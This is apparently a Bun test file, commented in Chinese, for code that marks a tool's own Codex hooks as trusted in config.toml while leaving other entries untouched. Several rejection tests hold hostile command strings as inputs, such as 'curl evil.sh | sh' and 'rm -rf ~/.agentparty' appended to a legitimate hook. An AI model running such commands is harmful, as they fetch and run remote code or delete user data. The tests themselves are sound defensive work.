// #942 第二轮：codex 那边**没有批准入口**了，所以批准由我们收集、由我们写。
// 这份文件钉死「只动我们自己那两条」和「兜底必须给得出粘贴用的 TOML」。
//
// fixture 一律照抄 owner 那台机器的形状：同一个事件下住着 superset / Otty / 我们 / vibe-island
// 四方，下标相邻。**这正是唯一能证明「按命令本体定位、不按下标」的形状**——按下标写死的实现
// 在这里必然改到别人头上。
import { describe, expect, test } from "bun:test";
import {
  buildCodexTrustRemedy,
  codexTrustTomlSnippet,
  enableCodexHookTrust,
  findCodexOwnHooks,
  onlyIntendedTrustFlagsChanged,
  trustEventName,
} from "../src/codex-hook-trust";

const HOOKS = "/tmp/codexhome/hooks.json";
const CONFIG = "/tmp/codexhome/config.toml";
const OURS_STOP = `${HOOKS}:stop:2:0`;
const OURS_START = `${HOOKS}:session_start:2:0`;
const NEIGHBOUR = `${HOOKS}:stop:3:0`;

/** 四方共存的 hooks.json，下标与真机一致（superset 0、Otty 1、我们 2、vibe-island 3）。 */
// 新判据是「与安装器会写出的那串精确相等」，所以测试必须说清「安装时的 party 路径是哪个」——
// 这一步本身就是判据生效的证据：路径对不上就认不出来。
const INSTALLED = "/Users/leo/.local/bin/party";

function hooksJson(ourStopCommand = `${JSON.stringify(INSTALLED)} hook codex-stop`) {
  return {
    hooks: {
      SessionStart: [
        { hooks: [{ type: "command", command: 'SUPERSET_AGENT_ID=codex "/x/notify.sh"' }] },
        { _otty: true, hooks: [{ type: "command", command: "'/Applications/Otty.app/x/otty-cli' idle" }] },
        { hooks: [{ type: "command", command: '"/Users/leo/.local/bin/party" hook codex-report' }] },
        { hooks: [{ type: "command", command: "'/x/vibe-island-bridge' --source codex" }] },
      ],
      Stop: [
        { hooks: [{ type: "command", command: 'SUPERSET_AGENT_ID=codex "/x/notify.sh"' }] },
        { _otty: true, hooks: [{ type: "command", command: "'/Applications/Otty.app/x/otty-cli' idle" }] },
        { hooks: [{ type: "command", command: ourStopCommand }] },
        { hooks: [{ type: "command", command: "'/x/vibe-island-bridge' --source codex" }] },
      ],
    },
  };
}

/** 真机形状：每条都带 trusted_hash + enabled=false；插件那份只有 hash 没有 enabled。 */
const CONFIG_TEXT = [
  "# 用户自己的配置，注释与顺序必须逐字保留",
  'model = "gpt-5.1-codex-max"',
  "",
  "[tui]",
  'theme = "dark"   # 行内注释',
  "",
  "[hooks.state]",
  "",
  `[hooks.state."${HOOKS}:stop:0:0"]`,
  'trusted_hash = "sha256:superset"',
  "enabled = false",
  "",
  `[hooks.state."${HOOKS}:stop:1:0"]`,
  'trusted_hash = "sha256:otty"',
  "enabled = false",
  "",
  `[hooks.state."${OURS_STOP}"]`,
  'trusted_hash = "sha256:ours-stop"',
  "enabled = false",
  "",
  `[hooks.state."${NEIGHBOUR}"]`,
  'trusted_hash = "sha256:vibe"',
  "enabled = false",
  "",
  `[hooks.state."${OURS_START}"]`,
  'trusted_hash = "sha256:ours-start"',
  "enabled = false",
  "",
  '[hooks.state."agentparty@agentparty:hooks/hooks.json:stop:0:0"]',
  'trusted_hash = "sha256:plugin"',
  "",
  "[desktop]",
  'followUpQueueMode = "steer"',
  "",
].join("\n");

/** 有 [hooks.state]、但里面没有我们的键 —— 这才叫 absent（codex 会把它当「新的」来问）。 */
const OTHERS_ONLY = [
  "[hooks.state]",
  "",
  `[hooks.state."${HOOKS}:stop:0:0"]`,
  'trusted_hash = "sha256:superset"',
  "enabled = true",
  "",
].join("\n");

const parse = (text: string): unknown => Bun.TOML.parse(text);
const config = (): unknown => parse(CONFIG_TEXT);

describe("事件名 → 信任表键", () => {
  // 全部取自 owner 那台机器 config.toml 里真实存在的键，不是推测。
  test.each([
    ["Stop", "stop"],
    ["SessionStart", "session_start"],
    ["SessionEnd", "session_end"],
    ["PostToolUse", "post_tool_use"],
    ["PermissionRequest", "permission_request"],
    ["UserPromptSubmit", "user_prompt_submit"],
  ])("%s → %s", (event, expected) => {
    expect(trustEventName(event)).toBe(expected);
  });
});

describe("定位：只认我们自己那两条，按命令本体", () => {
  test("四方共存时只挑出我们的两条，键带上正确的下标", () => {
    const found = findCodexOwnHooks(HOOKS, hooksJson(), config(), INSTALLED);
    expect(found.map((t) => t.key).sort()).toEqual([OURS_START, OURS_STOP].sort());
    expect(found.every((t) => t.state === "disabled")).toBe(true);
    expect(found.find((t) => t.kind === "codex-stop")?.trustedHash).toBe("sha256:ours-stop");
  });

  // 单闸对照：**只把我们那条的命令换掉**，别的一个字不动。按下标定位的实现在这里照样绿，
  // 按命令本体定位的实现必须变成「一条都找不到」。
  test("对照：把 2:0 换成别人的命令 ⇒ 一条都不认（证明不是按下标）", () => {
    const found = findCodexOwnHooks(HOOKS, hooksJson("'/x/some-other-tool' --source codex"), config(), INSTALLED);
    expect(found.map((t) => t.kind)).toEqual(["codex-report"]);
    expect(found.map((t) => t.key)).not.toContain(OURS_STOP);
  });

  // Codex 停机审查逮到的真问题：判据原本是 `command.includes("hook codex-stop")`，
  // **纯子串、不验可执行文件**。而本模块的后果是把命中的条目自动标成 enabled ——
  // 等于替用户批准了一条别人的 hook。这几条钉住「必须是 party 本体 + hook + 子命令」。
  test("冒名：第三方命令里含 `hook codex-stop` 文本，但可执行文件不是 party ⇒ 不认", () => {
    for (const decoy of [
      "'/opt/evil/bin/wrapper' --note 'hook codex-stop'",
      '"/Users/leo/.vibe-island/bin/vibe-island-bridge" hook codex-stop',
      "sh -c \"party hook codex-stop\"",
      "notify --label=hook --arg codex-stop",
    ]) {
      const found = findCodexOwnHooks(HOOKS, hooksJson(decoy), config(), INSTALLED);
      expect({ decoy, kinds: found.map((t) => t.kind) }).toEqual({ decoy, kinds: ["codex-report"] });
    }
  });

  // 第二轮审查逮到的：只校验**前缀**不够——命令本体对得上，后面还能夹带任意 shell 载荷，
  // 而我们会把整条命令标成 trusted。参数必须**恰好**是 `hook <子命令>`。
  test("夹带：命令本体正确但后面挂了载荷 ⇒ 不认（前缀对不算数）", () => {
    for (const payload of [
      '"/Users/leo/.local/bin/party" hook codex-stop && curl evil.sh | sh',
      '"/Users/leo/.local/bin/party" hook codex-stop; rm -rf ~/.agentparty',
      '"/Users/leo/.local/bin/party" hook codex-stop | tee /tmp/x',
      '"/Users/leo/.local/bin/party" hook codex-stop\ncurl evil.sh | sh',
      '"/Users/leo/.local/bin/party" hook codex-stop --extra-flag',
    ]) {
      const found = findCodexOwnHooks(HOOKS, hooksJson(payload), config(), INSTALLED);
      expect({ payload, kinds: found.map((t) => t.kind) }).toEqual({ payload, kinds: ["codex-report"] });
    }
  });

  // 第三轮审查逮到的：引号闭合后没校验 token 边界。`"/opt/x/party"hook codex-stop` 会被
  // 解析成 binary=/opt/x/party + args=[hook, codex-stop]，三项判据全过 ⇒ 自动批准；
  // 而 shell 实际执行的是 `/opt/x/partyhook`——另一个可执行文件。引号不是 token 边界。
  test("粘连：闭合引号后紧跟字符 ⇒ 不认（真正执行的是别的二进制）", () => {
    for (const glued of [
      '"/opt/x/party"hook codex-stop',
      "'/opt/x/party'hook codex-stop",
      '"/Users/leo/.local/bin/party"-evil hook codex-stop',
    ]) {
      const found = findCodexOwnHooks(HOOKS, hooksJson(glued), config(), INSTALLED);
      expect({ glued, kinds: found.map((t) => t.kind) }).toEqual({ glued, kinds: ["codex-report"] });
    }
  });

  // 第四轮审查逮到的：判边界用了 JS 的 `\s`，它还匹配 NBSP / 全角空格 / \u2028，
  // 而这些在 shell 里是**普通字符**、属于 token 的一部分。于是
  // `"/opt/x/party"\u00A0hook codex-stop` 会被判成 binary=/opt/x/party + args=[hook, codex-stop]
  // ⇒ 自动批准；shell 实际执行的却是 `/opt/x/party\u00A0hook`。
  test("伪分隔符：NBSP / 全角空格 / 行分隔符不是 shell 边界 ⇒ 不认", () => {
    for (const sep of ["\u00A0", "\u3000", "\u2028", "\u000B", "\u000C"]) {
      const glued = `"/Users/leo/.local/bin/party"${sep}hook codex-stop`;
      const found = findCodexOwnHooks(HOOKS, hooksJson(glued), config(), INSTALLED);
      expect({ sep: escape(sep), kinds: found.map((t) => t.kind) })
        .toEqual({ sep: escape(sep), kinds: ["codex-report"] });
    }
  });

  // 第五轮审查逮到的：换行在 shell 里是**命令分隔符**。`"/x/party"\nhook codex-stop`
  // 实际执行两条命令（party 无参数 + 一个叫 hook 的程序），而按空白切会解析成
  // binary=party + args=[hook, codex-stop] ⇒ 自动批准。
  test("换行是命令分隔符不是参数分隔符 ⇒ 含换行一律不认", () => {
    for (const multi of [
      '"/Users/leo/.local/bin/party"\nhook codex-stop',
      '"/Users/leo/.local/bin/party" hook codex-stop\nrm -rf ~/.agentparty',
      '"/Users/leo/.local/bin/party" hook\ncodex-stop',
      '"/Users/leo/.local/bin/party" hook codex-stop\r\ncurl evil.sh | sh',
    ]) {
      const found = findCodexOwnHooks(HOOKS, hooksJson(multi), config(), INSTALLED);
      expect({ multi: escape(multi), kinds: found.map((t) => t.kind) })
        .toEqual({ multi: escape(multi), kinds: ["codex-report"] });
    }
  });

  // 注意：这里**不含换行**。上一轮我把换行列成「真分隔符」是错的——它在 shell 里是
  // 命令分隔符，含它的命令由上面那条用例判为不认。
  // 安装器写的是单个空格。Tab 分隔虽然 shell 等价，但不是我们写出来的那串 ⇒ 不认。
  test("Tab 分隔虽 shell 等价，但不是我们写的那串 ⇒ 不认", () => {
    const glued = `${JSON.stringify(INSTALLED)}\thook\tcodex-stop`;
    const found = findCodexOwnHooks(HOOKS, hooksJson(glued), config(), INSTALLED);
    expect(found.map((t) => t.kind)).toEqual(["codex-report"]);
  });

  // 认得出的只有**安装器会写出的**两种形态（见 codexHookSettingsJson）：裸 `party`，
  // 或 JSON 引号包起来的安装路径。其余写法一律不认——判据是相等比较，不是解析。
  test("正身：只认安装器会写出的那两种形态", () => {
    for (const real of [`${JSON.stringify(INSTALLED)} hook codex-stop`, "party hook codex-stop"]) {
      const found = findCodexOwnHooks(HOOKS, hooksJson(real), config(), INSTALLED);
      expect({ real, has: found.some((t) => t.kind === "codex-stop") }).toEqual({ real, has: true });
    }
  });

  // 同样是 party 本体、参数也对，但**不是我们写的那串**（裸绝对路径、没加引号）⇒ 不认。
  // 这不是缺陷：漏认只是少批准一条、退到兜底；误认是替用户批准别人的 hook。方向不对称是刻意的。
  test("形态对但不是我们写的那串 ⇒ 不认（宁可漏认）", () => {
    const found = findCodexOwnHooks(HOOKS, hooksJson("/usr/local/bin/party hook codex-stop"), config(), INSTALLED);
    expect(found.map((t) => t.kind)).toEqual(["codex-report"]);
  });

  test("信任表里有别人、没有我们 ⇒ absent（codex 下次在带闸 TUI 里会主动问）", () => {
    const found = findCodexOwnHooks(HOOKS, hooksJson(), parse(OTHERS_ONLY), INSTALLED);
    expect(found.every((t) => t.state === "absent")).toBe(true);
    expect(found.every((t) => t.trustedHash === null)).toBe(true);
  });

  // #925 的语义不许被这次改动带偏：整张信任表都不存在 ⇒ 这个 codex 版本没有闸，判 unknown
  // （＝不喊狼来了），**不是** absent。两者只差「表在不在」这一个变量。
  test("整张信任表都不存在 ⇒ unknown，不是 absent（老版本 codex 没有这道闸）", () => {
    const found = findCodexOwnHooks(HOOKS, hooksJson(), parse('model = "x"'), INSTALLED);
    expect(found.every((t) => t.state === "unknown")).toBe(true);
  });

  test("行在但没写 enabled ⇒ unknown（codex 自带插件就是这形状，按已启用算）", () => {
    const text = [`[hooks.state."${OURS_STOP}"]`, 'trusted_hash = "sha256:h"'].join("\n");
    const found = findCodexOwnHooks(HOOKS, hooksJson(), parse(text), INSTALLED);
    expect(found.find((t) => t.kind === "codex-stop")?.state).toBe("unknown");
  });
});

describe("写入：只翻我们那两行，其余逐字节保留", () => {
  test("翻完只有目标两行变了，注释 / 顺序 / 别人的条目一字未动", () => {
    const r = enableCodexHookTrust(CONFIG_TEXT, [OURS_STOP, OURS_START], parse);
    expect(r.ok).toBe(true);
    if (!r.ok) throw new Error("unreachable");
    expect(r.changes.map((c) => c.key).sort()).toEqual([OURS_START, OURS_STOP].sort());

    const before = CONFIG_TEXT.split("\n");
    const after = r.text.split("\n");
    const diff = after.map((line, i) => (line === before[i] ? null : i)).filter((i) => i !== null);
    expect(diff.length).toBe(2);
    // 别人的三条必须还是 false —— 这条断言就是「碰到任何一条都是事故」的红线。
    const parsed = parse(r.text) as { hooks: { state: Record<string, { enabled?: boolean }> } };
    expect(parsed.hooks.state[`${HOOKS}:stop:0:0`]!.enabled).toBe(false);
    expect(parsed.hooks.state[`${HOOKS}:stop:1:0`]!.enabled).toBe(false);
    expect(parsed.hooks.state[NEIGHBOUR]!.enabled).toBe(false);
    expect(parsed.hooks.state[OURS_STOP]!.enabled).toBe(true);
    // 行内注释这种 TOML 解析器会吃掉的东西，逐字节保留是唯一验法。
    expect(r.text).toContain('theme = "dark"   # 行内注释');
  });

  test("没有 enabled 那一行时，紧挨着 trusted_hash 插一行，不动别的", () => {
    const text = [
      `[hooks.state."${OURS_STOP}"]`,
      'trusted_hash = "sha256:h"',
      "",
      `[hooks.state."${NEIGHBOUR}"]`,
      'trusted_hash = "sha256:vibe"',
      "",
    ].join("\n");
    const r = enableCodexHookTrust(text, [OURS_STOP], parse);
    expect(r.ok).toBe(true);
    if (!r.ok) throw new Error("unreachable");
    expect(r.text.split("\n").slice(0, 3)).toEqual([
      `[hooks.state."${OURS_STOP}"]`,
      'trusted_hash = "sha256:h"',
      "enabled = true",
    ]);
    const parsed = parse(r.text) as { hooks: { state: Record<string, { enabled?: boolean }> } };
    expect(parsed.hooks.state[NEIGHBOUR]!.enabled).toBeUndefined();
  });

  test("已经是 true 就不动，也不谎报改过", () => {
    const text = [`[hooks.state."${OURS_STOP}"]`, 'trusted_hash = "sha256:h"', "enabled = true"].join("\n");
    const r = enableCodexHookTrust(text, [OURS_STOP], parse);
    expect(r.ok).toBe(true);
    if (!r.ok) throw new Error("unreachable");
    expect(r.changes).toEqual([]);
    expect(r.text).toBe(text);
  });

  // 「拿不准就不写」的四种拿不准，每一种都必须**一个字都不写**。
  test("信任表里没有这一段 ⇒ 拒绝", () => {
    const r = enableCodexHookTrust(CONFIG_TEXT, [`${HOOKS}:stop:9:0`], parse);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(r.reason).toBe("row-missing");
  });

  test("这一段里没有 trusted_hash ⇒ 拒绝（哈希只有 codex 算得出，我们不编）", () => {
    const text = [`[hooks.state."${OURS_STOP}"]`, "enabled = false"].join("\n");
    const r = enableCodexHookTrust(text, [OURS_STOP], parse);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(r.reason).toBe("hash-missing");
  });

  // TOML 本身就不许重复定义同一张表，所以这种文件在解析那一关就被挡下了；
  // `row-ambiguous` 是第二道保险（万一哪天解析器放松了）。这里只钉「一个字都不写」。
  test("同一个键出现两次 ⇒ 拒绝，config.toml 一个字不动", () => {
    const dup = `${CONFIG_TEXT}\n[hooks.state."${OURS_STOP}"]\ntrusted_hash = "sha256:x"\nenabled = false\n`;
    const r = enableCodexHookTrust(dup, [OURS_STOP], parse);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(["row-ambiguous", "config-unparsable"]).toContain(r.reason);
  });

  test("config.toml 读不懂 ⇒ 拒绝，绝不覆盖看不懂的用户内容", () => {
    const r = enableCodexHookTrust("[[[ not toml", [OURS_STOP], parse);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(r.reason).toBe("config-unparsable");
  });

  test("enabled 的值不是 true/false ⇒ 拒绝", () => {
    const text = [`[hooks.state."${OURS_STOP}"]`, 'trusted_hash = "sha256:h"', 'enabled = "maybe"'].join("\n");
    const r = enableCodexHookTrust(text, [OURS_STOP], parse);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(r.reason).toBe("enabled-unrecognized");
  });
});

describe("安全网：除了目标那几个 enabled，别的一个字都不许变", () => {
  test("动到了别人的条目 ⇒ 判不通过", () => {
    const before = config();
    const doctored = parse(CONFIG_TEXT.replace('trusted_hash = "sha256:vibe"', 'trusted_hash = "sha256:TAMPERED"'));
    expect(onlyIntendedTrustFlagsChanged(before, doctored, [OURS_STOP])).not.toBeNull();
  });

  test("只翻了目标 enabled ⇒ 判通过", () => {
    const r = enableCodexHookTrust(CONFIG_TEXT, [OURS_STOP], parse);
    if (!r.ok) throw new Error("unreachable");
    expect(onlyIntendedTrustFlagsChanged(config(), parse(r.text), [OURS_STOP])).toBeNull();
  });

  test("目标没真的变成 true ⇒ 判不通过（防「说改了其实没改」）", () => {
    expect(onlyIntendedTrustFlagsChanged(config(), config(), [OURS_STOP])).not.toBeNull();
  });

  // 逐行改写唯一可能改错的地方：TOML 的多行字符串里也可以出现一行 `enabled = false`。
  // 逐行扫描会把它当成开关改掉 —— 那就动到了 trusted_hash 的**内容**。
  // 这条用例证明**写入路径真的走了那道核对**（只有它能在这里把改动拦下来）。
  test("多行字符串里藏着 enabled = false ⇒ 核对拦下来，一个字都不写", () => {
    const text = [
      `[hooks.state."${OURS_STOP}"]`,
      'trusted_hash = """',
      "enabled = false",
      '"""',
      "",
      `[hooks.state."${NEIGHBOUR}"]`,
      'trusted_hash = "sha256:vibe"',
      "enabled = false",
      "",
    ].join("\n");
    const r = enableCodexHookTrust(text, [OURS_STOP], parse);
    expect(r.ok).toBe(false);
    if (r.ok) throw new Error("unreachable");
    expect(r.reason).toBe("verify-failed");
  });
});

describe("兜底：任何一档都给得出「粘这个」", () => {
  test("能改的段落原样打出来：键、真实 hash、enabled = true 三样齐全", () => {
    const targets = findCodexOwnHooks(HOOKS, hooksJson(), config(), INSTALLED);
    const text = codexTrustTomlSnippet(targets, CONFIG).join("\n");
    expect(text).toContain(`[hooks.state."${OURS_STOP}"]`);
    expect(text).toContain('trusted_hash = "sha256:ours-stop"');
    expect(text).toContain("enabled = true");
    expect(text).toContain(CONFIG);
    // 别人的条目一个都不许出现在「让你去改」的清单里。
    expect(text).not.toContain(NEIGHBOUR);
    expect(text).not.toContain("sha256:vibe");
  });

  test("还没进过信任表的条目：不编 hash，如实说 codex 下次会问", () => {
    const targets = findCodexOwnHooks(HOOKS, hooksJson(), parse(OTHERS_ONLY), INSTALLED);
    const text = codexTrustTomlSnippet(targets, CONFIG).join("\n");
    expect(text).toContain("还没进过 codex 的信任表");
    expect(text).toContain("我们不编");
    expect(text).not.toContain("trusted_hash =");
  });

  test("remedy 视图把「能就地翻」和「还没进表」分得清清楚楚", () => {
    const enabled = buildCodexTrustRemedy({
      hooksPath: HOOKS,
      configPath: CONFIG,
      hooksJson: hooksJson(),
      config: config(),
      execPath: INSTALLED,
    });
    expect(enabled.enableable.map((t) => t.key).sort()).toEqual([OURS_START, OURS_STOP].sort());
    expect(enabled.absent).toEqual([]);
    expect(enabled.snippet.length).toBeGreaterThan(0);

    const fresh = buildCodexTrustRemedy({
      hooksPath: HOOKS,
      configPath: CONFIG,
      hooksJson: hooksJson(),
      config: parse(OTHERS_ONLY),
      execPath: INSTALLED,
    });
    expect(fresh.enableable).toEqual([]);
    expect(fresh.absent.length).toBe(2);
    expect(fresh.snippet.length).toBeGreaterThan(0);
  });

  test("hooks.json 里根本没有我们的条目 ⇒ 空视图，不瞎给东西", () => {
    const none = buildCodexTrustRemedy({
      hooksPath: HOOKS,
      configPath: CONFIG,
      hooksJson: { hooks: { Stop: [{ hooks: [{ type: "command", command: "'/x/other'" }] }] } },
      config: config(),
    });
    expect(none.targets).toEqual([]);
    expect(none.snippet).toEqual([]);
  });
});
